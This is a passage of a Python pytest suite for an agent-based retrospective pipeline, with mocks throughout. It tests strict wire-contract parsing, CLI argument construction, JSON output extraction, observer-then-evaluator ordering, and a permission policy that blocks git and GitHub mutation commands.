#!/usr/bin/env python3
"""Tests for run_retrospective.py (Issue #2237, iteration-3 fix_delta for
OWNER review #2237#issuecomment-5378291560).

Fixture/mock-based only (Runtime Verification Applicability: deferred -- see
Issue #2237 body). No live GitHub/Web/git/Agent call is ever made; every I/O
boundary (``base_sha_resolver``, collectors, Agent invocation ``runner``) is
dependency-injected.

Covers every Issue #2237 AC that is a pytest -k target:
  AC2  skill_md_under_500_lines
  AC7  wire_contract_dataclass_roundtrip
  AC8  base_sha_fixed_once
  AC9  evaluator_waits_for_observer
  AC10 evaluator_receives_typed_projection_only
  AC11 no_mutation_side_effect
  AC13 production_agent_invocation_adapter
  AC14 schema_repair_retry_bounded
  AC15 previous_state_provider_five_states
  AC16 publish_request_forbidden_fields
  AC17 delegated_agent_mutation_denied
  AC18 temp_artifact_cleanup_all_paths

Plus the 12 production-shaped fix_delta gates required by OWNER review #3
(each named exactly as required):
  1  test_cli_selects_named_agent_and_uses_inline_schema
  2  test_private_prompt_uses_stdin_and_disables_session_persistence
  3  test_actual_claude_json_wrapper_extracts_structured_output
  4  test_executable_entrypoint_collectors_to_publish_request
  5  test_nested_private_evidence_and_authority_fields_rejected
  6  test_candidate_records_validate_current_canonical_schema
  7  test_delta_uses_2289_fixtures_and_incomplete_state_is_indeterminate
  8  test_permission_policy_is_consumed_by_runtime_and_bypass_resistant
  9  test_exact_observer_manifest_base_sha_and_role_authority
  10 test_web_result_is_recollected_and_digest_bound
  11 test_public_projection_digest_binds_source_and_concurrency_state
  12 test_temp_scope_is_on_production_path_and_cleanup_failure_surfaces
"""

from __future__ import annotations

import copy
import dataclasses
import json
import os
import shutil
import signal
import subprocess
import sys
from pathlib import Path
from typing import Any

import jsonschema
import pytest

_SCRIPTS_DIR = Path(__file__).resolve().parents[1]
_SKILL_DIR = _SCRIPTS_DIR.parent
sys.path.insert(0, str(_SCRIPTS_DIR))

import run_retrospective as rr  # noqa: E402

_validate_mod = rr._validate_retrospective_schema_module()

_FULL_SHA = "a" * 40
_OTHER_SHA = "b" * 40
_DIGEST = "d" * 64
#: Issue #2362 AC1: run_evaluation() now requires repository_id as
#: Python-side caller context (never part of EvaluatorRequest) -- this is
#: the single fixture value every direct rr.run_evaluation() call site in
#: this file passes, matching _identity_key()'s repository_id below.
_REPOSITORY_ID = "squne121/loop-protocol"


# ---------------------------------------------------------------------------
# AC2: SKILL.md line-count assertion
# ---------------------------------------------------------------------------


def test_skill_md_under_500_lines() -> None:
    skill_md = _SKILL_DIR / "SKILL.md"
    assert skill_md.is_file(), f"missing {skill_md}"
    line_count = len(skill_md.read_text(encoding="utf-8").splitlines())
    assert line_count < 500, f"SKILL.md has {line_count} lines, must be < 500"


# ---------------------------------------------------------------------------
# canonical agent_improvement_candidate/v1 record builders (shared helper,
# used by AC7/AC15/AC16 and fix_delta gates #6/#7/#9/#10/#11)
# ---------------------------------------------------------------------------


def _identity_key(rule_id: str, path: str = "schemas/x.json") -> dict[str, Any]:
    return {
        "repository_id": "squne121/loop-protocol",
        "claim_class": "runtime_behavior",
        "subject_ref": {"kind": "repository_path", "value": path},
        "rule_id": rule_id,
    }


def _finding_identity(rule_id: str, path: str = "schemas/x.json") -> dict[str, Any]:
    key = _identity_key(rule_id, path)
    value = _validate_mod.compute_finding_identity(key)
    return {"algorithm": "sha256-jcs-v1", "key": key, "value": value}


def _evidence_ref(suffix: str = "1") -> dict[str, Any]:
    return {
        "ref_type": "repository_blob",
        "source_id": "repository",
        "resource_identity": f"schemas/x.json#{suffix}",
        "projection_digest": "sha256:" + ("1" * 64),
    }


def _evaluation_entry(
    *,
    rule_id: str,
    presence_delta: str,
    observed: bool,
    source_coverage: str = "complete",
    evaluation_status: str = "classified",
    previous_ref: str | None = None,
    delta_status: str | None = None,
    indeterminate_reason: str | None = None,
    evidence_refs: list[dict[str, Any]] | None = None,
    seq: int = 1,
) -> dict[str, Any]:
    eval_id = "sha256:" + format(abs(hash((rule_id, presence_delta, seq))), "064x")[:64]
    signal = {"signal_type": "boolean", "value": observed, "comparator": "eq", "worse_direction": "not_applicable"}
    return {
        "evaluation_id": eval_id,
        "evaluated_run_ref": {"base_sha": _FULL_SHA, "source_set_digest": _DIGEST},
        "previous_evaluation_ref": previous_ref,
        "observed": observed,
        "source_coverage": source_coverage,
        "evaluation_status": evaluation_status,
        "presence_delta": presence_delta,
        "signal_delta": "unknown",
        "delta_status": delta_status if evaluation_status == "classified" else None,
        "indeterminate_reason": indeterminate_reason,
        "baseline_signal": None
        if presence_delta in ("new",)
        else (signal if evaluation_status == "classified" else None),
        "current_signal": signal if evaluation_status == "classified" and presence_delta != "resolved" else None,
        "expected_signal": None,
        "evidence_refs": evidence_refs
        if evidence_refs is not None
        else ([_evidence_ref()] if evaluation_status == "classified" else []),
        "classified_at": "2026-08-22T00:00:00Z",
        "classifier_version": "run_retrospective/v1",
    }


def _canonical_candidate(
    *,
    candidate_id: str,
    rule_id: str,
    evaluations: list[dict[str, Any]],
    path: str = "schemas/x.json",
) -> dict[str, Any]:
    return {
        "candidate_id": candidate_id,
        "candidate_status": "proposed",
        "title": f"fixture candidate {candidate_id}",
        "description": f"fixture candidate for {rule_id}",
        "source_run_ref": {"base_sha": _FULL_SHA, "source_set_digest": _DIGEST},
        "created_at": "2026-08-22T00:00:00Z",
        "updated_at": "2026-08-22T00:00:00Z",
        "finding_contract": {
            "schema_version": "v1",
            "identity": _finding_identity(rule_id, path),
            "claim_class": "runtime_behavior",
            "evaluations": evaluations,
        },
    }


def _new_candidate(candidate_id: str = "cand-new-0001", rule_id: str = "example_rule") -> dict[str, Any]:
    evaluation = _evaluation_entry(rule_id=rule_id, presence_delta="new", observed=True, delta_status="new")
    return _canonical_candidate(candidate_id=candidate_id, rule_id=rule_id, evaluations=[evaluation])


# ---------------------------------------------------------------------------
# AC7: wire contract dataclass round-trip
# ---------------------------------------------------------------------------

_WIRE_CLASSES = [rr.SourcePlan, rr.EvidenceBundle, rr.FindingSet, rr.Evaluation, rr.PublishRequest]


@pytest.mark.parametrize("cls", _WIRE_CLASSES)
def test_wire_contract_dataclass_roundtrip_is_dataclass(cls: type) -> None:
    assert dataclasses.is_dataclass(cls)
    field_names = {f.name for f in dataclasses.fields(cls)}
    assert "schema_version" in field_names


def _sample_source_plan() -> rr.SourcePlan:
    return rr.SourcePlan(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest="digest-1",
        sources=["repository"],
        generated_at="2026-01-01T00:00:00Z",
    )


def _sample_evidence_bundle() -> rr.EvidenceBundle:
    return rr.EvidenceBundle(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest="digest-1",
        observer_id="runtime-observer",
        evidence_ref="evidence://run-1/observer-1",
        findings=[{"claim": "example finding", "claim_class": "process"}],
    )


def _sample_finding_set() -> rr.FindingSet:
    return rr.FindingSet(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest="digest-1",
        observer_id="runtime-observer",
        findings=[{"claim": "example finding", "claim_class": "process"}],
    )


def _sample_evaluation() -> rr.Evaluation:
    return rr.Evaluation(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest=_DIGEST,
        candidate_records=[_new_candidate()],
        evidence_ref="evidence://run-1/evaluation",
    )


def _sample_publish_request() -> rr.PublishRequest:
    return rr.PublishRequest(
        request_id="req-1",
        repository_id="squne121/loop-protocol",
        target_issue=2237,
        run_identity={"run_id": "run-1", "base_sha": _FULL_SHA, "source_set_digest": _DIGEST},
        candidate_records=[_new_candidate()],
        expected_previous_digest=None,
        idempotency_key="idem-1",
        public_projection_digest="a" * 64,
        authorization_required=True,
    )


_SAMPLE_BUILDERS = {
    rr.SourcePlan: _sample_source_plan,
    rr.EvidenceBundle: _sample_evidence_bundle,
    rr.FindingSet: _sample_finding_set,
    rr.Evaluation: _sample_evaluation,
    rr.PublishRequest: _sample_publish_request,
}


@pytest.mark.parametrize("cls", _WIRE_CLASSES)
def test_wire_contract_dataclass_roundtrip(cls: type) -> None:
    instance = _SAMPLE_BUILDERS[cls]()
    wire_text = instance.to_wire()
    # GIVEN a serialized Agent output string (not a hand-built dataclass)
    # WHEN it is parsed via the strict deserializer
    parsed = cls.from_wire(wire_text)
    # THEN re-serializing it is byte-identical (round-trip invariant)
    assert parsed.to_wire() == wire_text
    assert parsed == instance


@pytest.mark.parametrize("cls", _WIRE_CLASSES)
def test_wire_contract_dataclass_roundtrip_rejects_unknown_field(cls: type) -> None:
    instance = _SAMPLE_BUILDERS[cls]()
    payload = json.loads(instance.to_wire())
    payload["unexpected_extra_field"] = "smuggled"
    with pytest.raises(rr.WireContractError) as excinfo:
        cls.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "unknown_field"


@pytest.mark.parametrize("cls", _WIRE_CLASSES)
def test_wire_contract_dataclass_roundtrip_rejects_missing_field(cls: type) -> None:
    instance = _SAMPLE_BUILDERS[cls]()
    payload = json.loads(instance.to_wire())
    del payload["schema_version"]
    with pytest.raises(rr.WireContractError) as excinfo:
        cls.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "missing_field"


def test_wire_contract_dataclass_roundtrip_rejects_malformed_json() -> None:
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.SourcePlan.from_wire("{not valid json")
    assert excinfo.value.reason_code == "decode_failure"


def test_wire_contract_dataclass_roundtrip_rejects_oversize() -> None:
    huge_findings = [{"claim": "x" * 1000}] * 400
    bundle = rr.EvidenceBundle(
        run_id="run-1",
        base_sha=_FULL_SHA,
        source_set_digest="digest-1",
        observer_id="o",
        evidence_ref="e",
        findings=huge_findings,
    )
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.EvidenceBundle.from_wire(bundle.to_wire())
    assert excinfo.value.reason_code == "oversize"


def test_wire_contract_dataclass_roundtrip_run_id_agreement() -> None:
    plan = _sample_source_plan()
    bundle = _sample_evidence_bundle()
    rr.validate_run_id_agreement(plan, bundle)  # same run_id -> no raise
    mismatched = dataclasses.replace(bundle, run_id="different-run")
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.validate_run_id_agreement(plan, mismatched)
    assert excinfo.value.reason_code == "run_id_mismatch"


# ---------------------------------------------------------------------------
# AC8: base_sha fixed exactly once
# ---------------------------------------------------------------------------


def test_base_sha_fixed_once() -> None:
    call_count = {"n": 0}

    def resolver() -> str:
        call_count["n"] += 1
        return _FULL_SHA

    ctx = rr.RunContext(base_sha_resolver=resolver)
    for _ in range(5):
        assert ctx.base_sha == _FULL_SHA
    assert call_count["n"] == 1
    assert ctx.resolve_count == 1


def test_base_sha_fixed_once_across_prepare_collectors() -> None:
    call_count = {"n": 0}

    def resolver() -> str:
        call_count["n"] += 1
        return _FULL_SHA

    seen_base_shas: list[str] = []

    def make_collector(source_id: str):
        def _collector(base_sha: str):
            seen_base_shas.append(base_sha)
            return _fake_collector_result(source_id, base_sha)

        return _collector

    collectors = [make_collector("repository"), make_collector("github"), make_collector("web")]
    ctx, plan, results = rr.prepare(base_sha_resolver=resolver, collectors=collectors, run_id="run-1")
    assert call_count["n"] == 1
    assert seen_base_shas == [_FULL_SHA, _FULL_SHA, _FULL_SHA]
    assert plan.base_sha == _FULL_SHA
    assert len(results) == 3


def test_base_sha_fixed_once_rejects_non_full_sha() -> None:
    ctx = rr.RunContext(base_sha_resolver=lambda: "short-sha")
    with pytest.raises(ValueError):
        _ = ctx.base_sha


# ---------------------------------------------------------------------------
# helpers shared by AC9/AC10/AC11/AC13/AC14 and fix_delta gates
# ---------------------------------------------------------------------------


class _FakeCollectorResult:
    def __init__(self, observation: dict[str, Any], private_evidence: dict[str, Any] | None = None) -> None:
        self.observation = observation
        self.private_evidence: dict[str, Any] = private_evidence or {}


def _fake_collector_result(source_id: str, base_sha: str, digest: str | None = None) -> _FakeCollectorResult:
    return _FakeCollectorResult(
        {
            "source_type": "repository" if source_id == "repository" else "github",
            "source_id": source_id,
            "source_status": "complete",
            "pagination_completeness": "complete",
        },
        {"evidence_digest": digest} if digest else {},
    )


def _wrapper_payload(structured_output: dict[str, Any], *, is_error: bool = False) -> dict[str, Any]:
    """Shape of the *actual* `claude -p --output-format json` response: a
    metadata wrapper carrying `structured_output` as a nested field, not the
    business schema itself at the top level (Issue #2237 P0-1)."""
    return {
        "type": "result",
        "subtype": "success" if not is_error else "error",
        "is_error": is_error,
        "result": "assistant text summary",
        "structured_output": structured_output,
    }


def _ok_agent_result(payload: dict[str, Any]) -> rr.AgentInvocationResult:
    return rr.AgentInvocationResult(
        status="ok", structured_output=payload, raw_stdout_excerpt=None, exit_code=0, reason_code=None
    )


def _observer_request(agent_name: str, schema_path: str = "/tmp/schema.json") -> rr.AgentInvocationRequest:
    return rr.AgentInvocationRequest(
        agent_name=agent_name,
        prompt="observe",
        json_schema_path=schema_path,
        cwd="/repo",
    )


def _make_observer_invoke(run_id: str, digest: str, call_log: list[str], base_sha: str = _FULL_SHA):
    def _invoke(request: rr.AgentInvocationRequest) -> rr.AgentInvocationResult:
        call_log.append(f"observer:{request.agent_name}")
        bundle = rr.EvidenceBundle(
            run_id=run_id,
            base_sha=base_sha,
            source_set_digest=digest,
            observer_id=request.agent_name,
            evidence_ref=f"evidence://{run_id}/{request.agent_name}",
            findings=[{"claim": f"finding from {request.agent_name}", "claim_class": "process"}],
        )
        return _ok_agent_result(json.loads(bundle.to_wire()))

    return _invoke


def _make_evaluator_invoke(run_id: str, digest: str, call_log: list[str]):
    def _invoke(request: rr.EvaluatorRequest) -> rr.AgentInvocationResult:
        call_log.append("evaluator")
        evaluation = rr.Evaluation(
            run_id=run_id,
            base_sha=_FULL_SHA,
            source_set_digest=digest,
            candidate_records=[_new_candidate()],
            evidence_ref=f"evidence://{run_id}/evaluation",
        )
        return _ok_agent_result(json.loads(evaluation.to_wire()))

    return _invoke


def _run_full_pipeline(call_log: list[str]) -> tuple[rr.RunContext, rr.SourcePlan, rr.PublishRequest]:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    observer_requests = [
        _observer_request("retrospective-runtime-observer"),
        _observer_request("codebase-investigator"),
    ]
    bundles = rr.run_observer_wave(
        ctx,
        plan,
        invoke=_make_observer_invoke(ctx.run_id, plan.source_set_digest, call_log),
        observer_requests=observer_requests,
    )
    finding_sets = rr.build_finding_sets(ctx, plan, bundles)
    evaluator_request = rr.prepare_evaluator_request(ctx, plan, finding_sets)
    evaluation = rr.run_evaluation(
        ctx,
        evaluator_request,
        invoke_evaluator=_make_evaluator_invoke(ctx.run_id, plan.source_set_digest, call_log),
        repository_id=_REPOSITORY_ID,
    )
    publish_request = rr.finalize(
        ctx,
        plan,
        evaluation,
        repository_id="squne121/loop-protocol",
        target_issue=2237,
        request_id="req-1",
        idempotency_key="idem-1",
    )
    return ctx, plan, publish_request


# ---------------------------------------------------------------------------
# AC9: evaluator waits for observer wave completion
# ---------------------------------------------------------------------------


def test_evaluator_waits_for_observer_call_order() -> None:
    call_log: list[str] = []
    _run_full_pipeline(call_log)
    assert call_log == [
        "observer:retrospective-runtime-observer",
        "observer:codebase-investigator",
        "evaluator",
    ]


def test_evaluator_waits_for_observer_never_invoked_on_observer_failure() -> None:
    call_log: list[str] = []
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )

    def _failing_invoke(request: rr.AgentInvocationRequest) -> rr.AgentInvocationResult:
        call_log.append(f"observer:{request.agent_name}")
        return rr.AgentInvocationResult(
            status="timeout", structured_output=None, raw_stdout_excerpt=None, exit_code=None, reason_code="timeout"
        )

    def _evaluator_invoke_should_never_run(request: rr.EvaluatorRequest) -> rr.AgentInvocationResult:
        call_log.append("evaluator")
        raise AssertionError("evaluator must not be invoked when the observer wave failed")

    with pytest.raises(rr.ObserverWaveFailed):
        bundles = rr.run_observer_wave(
            ctx, plan, invoke=_failing_invoke, observer_requests=[_observer_request("retrospective-runtime-observer")]
        )
        finding_sets = rr.build_finding_sets(ctx, plan, bundles)
        evaluator_request = rr.prepare_evaluator_request(ctx, plan, finding_sets)
        rr.run_evaluation(
            ctx, evaluator_request, invoke_evaluator=_evaluator_invoke_should_never_run, repository_id=_REPOSITORY_ID
        )

    assert call_log == ["observer:retrospective-runtime-observer"]
    assert "evaluator" not in call_log


# ---------------------------------------------------------------------------
# AC10: evaluator only ever receives a typed, schema-controlled projection
# ---------------------------------------------------------------------------


def test_evaluator_receives_typed_projection_only() -> None:
    ctx, plan, _results = rr.prepare(
        base_sha_resolver=lambda: _FULL_SHA,
        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
        run_id="run-1",
    )
    bundle = rr.EvidenceBundle(
        run_id=ctx.run_id,
        base_sha=_FULL_SHA,
        source_set_digest=plan.source_set_digest,
        observer_id="runtime-observer",
        evidence_ref="evidence://run-1/observer-1",
        findings=[{"claim": "example finding", "claim_class": "process"}],
    )
    finding_sets = rr.build_finding_sets(ctx, plan, [bundle])
    evaluator_request = rr.prepare_evaluator_request(ctx, plan, finding_sets)

    captured: dict[str, Any] = {}

    def _capturing_invoke(request: rr.EvaluatorRequest) -> rr.AgentInvocationResult:
        captured["request"] = request
        captured["wire_text"] = request.to_wire()
        evaluation = rr.Evaluation(
            run_id=ctx.run_id,
            base_sha=_FULL_SHA,
            source_set_digest=plan.source_set_digest,
            candidate_records=[],
            evidence_ref="e",
        )
        return _ok_agent_result(json.loads(evaluation.to_wire()))

    rr.run_evaluation(ctx, evaluator_request, invoke_evaluator=_capturing_invoke, repository_id=_REPOSITORY_ID)

    # THEN the evaluator request never has an `evidence_ref` or raw-evidence-shaped field
    payload = json.loads(captured["wire_text"])
    assert set(payload.keys()) == {f.name for f in dataclasses.fields(rr.EvaluatorRequest)}
    assert "evidence_ref" not in payload
    assert "private_evidence" not in payload
    for finding_set_dict in payload["finding_sets"]:
        assert "evidence_ref" not in finding_set_dict
        assert "private_evidence" not in finding_set_dict


def test_evaluator_receives_typed_projection_only_rejects_raw_evidence_field() -> None:
    # GIVEN an attempt to smuggle a raw evidence channel into EVALUATOR_REQUEST_V1
    payload = json.loads(rr.EvaluatorRequest(run_id="r", base_sha=_FULL_SHA, source_set_digest="d").to_wire())
    payload["private_evidence"] = {"stdout": "raw log dump"}
    # THEN strict deserialization rejects it structurally
    with pytest.raises(rr.WireContractError) as excinfo:
        rr.EvaluatorRequest.from_wire(json.dumps(payload))
    assert excinfo.value.reason_code == "unknown_field"


# ---------------------------------------------------------------------------
# AC11: run_retrospective.py performs no GitHub/Issue mutation (proposal-only)
# ---------------------------------------------------------------------------


def test_no_mutation_side_effect(monkeypatch: pytest.MonkeyPatch) -> None:
    recorded_subprocess_calls: list[list[str]] = []

    def _spy_run(argv: list[str], **_kwargs: Any) -> subprocess.CompletedProcess:
        recorded_subprocess_calls.append(list(argv))
        raise AssertionError("this test's phases must never invoke subprocess.run directly")

    monkeypatch.setattr(subprocess, "run", _spy_run)

    call_log: list[str] = []
    _ctx, _plan, publish_request = _run_full_pipeline(call_log)

    # THEN no subprocess call happened at all (prepare/validate-observers/
    # prepare-evaluator/finalize never shell out; only `invoke_agent` -- via
    # the injected `runner` -- shells out, and this test's `invoke`/
    # `invoke_evaluator` callbacks are pure fakes that never call `invoke_agent`)
    assert recorded_subprocess_calls == []
    # AND the only produced artifact is a proposal-only PublishRequest
    assert isinstance(publish_request, rr.PublishRequest)
    payload = json.loads(publish_request.to_wire())
    assert rr.PUBLISH_REQUEST_FORBIDDEN_FIELDS.isdisjoint(payload.keys())
    assert publish_request.authorization_required is True


def test_no_mutation_side_effect_denies_mutation_argv_via_permission_policy() -> None:
    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
    for dangerous in ("git commit -m x", "git push origin main", "gh issue comment 1 --body x", "gh pr merge 1"):
        with pytest.raises(rr.PermissionDenied):
            policy.check_bash(dangerous)


# ---------------------------------------------------------------------------
# AC13: production Agent invocation adapter (subprocess mock harness)
# ---------------------------------------------------------------------------


def _invocation_request(schema_path: str = "/tmp/s.json") -> rr.AgentInvocationRequest:
    return rr.AgentInvocationRequest(
        agent_name="retrospective-runtime-observer", prompt="observe", json_schema_path=schema_path, cwd="/repo"
    )


def test_production_agent_invocation_adapter_argv_shape(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text('{"type": "object"}', encoding="utf-8")
    request = _invocation_request(str(schema_path))
    argv = rr.build_agent_invocation_argv(request)
    assert argv[:2] == ["claude", "-p"]
    assert "--agent" in argv and argv[argv.index("--agent") + 1] == request.agent_name
    assert "--output-format" in argv and argv[argv.index("--output-format") + 1] == "json"
    assert "--json-schema" in argv and argv[argv.index("--json-schema") + 1] == schema_path.read_text(encoding="utf-8")
    assert "--no-session-persistence" in argv
    assert "--bare" not in argv
    # the prompt text must never appear as an argv element
    assert request.prompt not in argv


def test_production_agent_invocation_adapter_success(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(
            argv, returncode=0, stdout=json.dumps(_wrapper_payload({"ok": True})), stderr=""
        )

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "ok"
    assert result.structured_output == {"ok": True}


def test_production_agent_invocation_adapter_timeout(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        raise subprocess.TimeoutExpired(cmd=argv, timeout=kwargs.get("timeout", 300))

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "timeout"
    assert result.reason_code == "timeout"


def test_production_agent_invocation_adapter_sigterm(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=-signal.SIGTERM, stdout="", stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "terminated"
    assert result.reason_code == "sigterm"


def test_production_agent_invocation_adapter_api_error(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=1, stdout="", stderr="internal error")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "api_error"
    assert result.reason_code == "nonzero_exit"


def test_production_agent_invocation_adapter_partial_result(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(
            argv, returncode=0, stdout=json.dumps(_wrapper_payload({}, is_error=True)), stderr=""
        )

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "partial_result"
    assert result.reason_code == "api_error_with_partial_text"


def test_production_agent_invocation_adapter_malformed_structured_output(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=0, stdout="not-json-at-all", stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "malformed_output"
    assert result.reason_code == "json_decode_failure"


# ---------------------------------------------------------------------------
# fix_delta gate #1: --agent <name> selection + inline schema content
# ---------------------------------------------------------------------------


def test_cli_selects_named_agent_and_uses_inline_schema(tmp_path: Path) -> None:
    schema_path = tmp_path / "evaluation_result_v1.schema.json"
    schema_text = json.dumps({"type": "object", "title": "evaluation_result/v1"})
    schema_path.write_text(schema_text, encoding="utf-8")

    request = rr.AgentInvocationRequest(
        agent_name="retrospective-evaluator", prompt="evaluate", json_schema_path=str(schema_path), cwd="/repo"
    )
    argv = rr.build_agent_invocation_argv(request)
    assert argv[argv.index("--agent") + 1] == "retrospective-evaluator"
    # the schema *content*, not the file path, is what is passed to the CLI
    assert argv[argv.index("--json-schema") + 1] == schema_text
    assert str(schema_path) not in argv


# ---------------------------------------------------------------------------
# fix_delta gate #2: prompt via stdin, --no-session-persistence
# ---------------------------------------------------------------------------


def test_private_prompt_uses_stdin_and_disables_session_persistence(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")
    request = rr.AgentInvocationRequest(
        agent_name="retrospective-runtime-observer",
        prompt="SECRET-PRIVATE-PROMPT-TEXT",
        json_schema_path=str(schema_path),
        cwd="/repo",
    )
    captured: dict[str, Any] = {}

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        captured["argv"] = argv
        captured["kwargs"] = kwargs
        return subprocess.CompletedProcess(
            argv, returncode=0, stdout=json.dumps(_wrapper_payload({"ok": True})), stderr=""
        )

    rr.invoke_agent(request, runner=_runner)
    assert "--no-session-persistence" in captured["argv"]
    assert request.prompt not in captured["argv"]
    assert captured["kwargs"]["input"] == request.prompt


# ---------------------------------------------------------------------------
# fix_delta gate #3: real claude JSON wrapper -> structured_output extraction
# ---------------------------------------------------------------------------


def test_actual_claude_json_wrapper_extracts_structured_output(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")
    business_payload = {"schema_version": "observer_result/v1", "run_id": "r"}

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        wrapper = _wrapper_payload(business_payload)
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "ok"
    # THEN only the nested `structured_output` field is surfaced, never the
    # wrapper itself (which would additionally contain type/subtype/result)
    assert result.structured_output == business_payload


def test_actual_claude_json_wrapper_rejects_missing_structured_output(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        wrapper = {"type": "result", "subtype": "success", "is_error": False, "result": "text only, no schema"}
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "malformed_output"
    assert result.reason_code == "missing_structured_output"


def test_actual_claude_json_wrapper_rejects_unexpected_shape(tmp_path: Path) -> None:
    schema_path = tmp_path / "s.json"
    schema_path.write_text("{}", encoding="utf-8")

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps({"unexpected": "shape"}), stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "malformed_output"
    assert result.reason_code == "unexpected_wrapper_shape"


# ---------------------------------------------------------------------------
# PR #2324 review fix_delta P0-1 regression guards + P1-2 hermetic coverage:
# `subtype` gate must run before any `result`/`structured_output` recovery,
# and compat recovery (`_structured_output_from_result_compat`) must only
# ever be attempted when `structured_output` is absent or explicitly `None`.
# ---------------------------------------------------------------------------


def _compat_schema(tmp_path: Path) -> Path:
    schema_path = tmp_path / "compat_schema.json"
    schema_path.write_text(
        json.dumps({"type": "object", "required": ["a"], "properties": {"a": {"type": "string"}}}),
        encoding="utf-8",
    )
    return schema_path


def test_fix_delta_p01_result_recovered_when_structured_output_absent(tmp_path: Path) -> None:
    schema_path = _compat_schema(tmp_path)
    business_payload = {"a": "from-result-raw"}

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        wrapper = {
            "type": "result",
            "subtype": "success",
            "is_error": False,
            "result": json.dumps(business_payload),
        }
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "ok"
    assert result.structured_output == business_payload


def test_fix_delta_p01_result_recovered_when_structured_output_explicit_null(tmp_path: Path) -> None:
    schema_path = _compat_schema(tmp_path)
    business_payload = {"a": "from-result-fenced"}

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        wrapper = {
            "type": "result",
            "subtype": "success",
            "is_error": False,
            "result": "```json\n" + json.dumps(business_payload) + "\n```",
            "structured_output": None,
        }
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "ok"
    assert result.structured_output == business_payload


def test_fix_delta_p01_non_success_subtype_never_promoted_to_ok(tmp_path: Path) -> None:
    schema_path = _compat_schema(tmp_path)
    business_payload = {"a": "should-not-be-accepted"}

    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        wrapper = {
            "type": "result",
            "subtype": "error_max_structured_output_retries",
            "is_error": False,
            "result": json.dumps(business_payload),
        }
        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")

    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
    assert result.status == "partial_result"
    assert result.reason_code == "result_subtype_not_success:error_max_structured_output_retries"


def test_fix_delta_p01_present_wrong_type_structured_output_never_recovers_from_result(tmp_path: Path) -> None:
    schema_path = _compat_schema(tmp_path)
    business_payload = {"a": "should-not-be-recovered"}

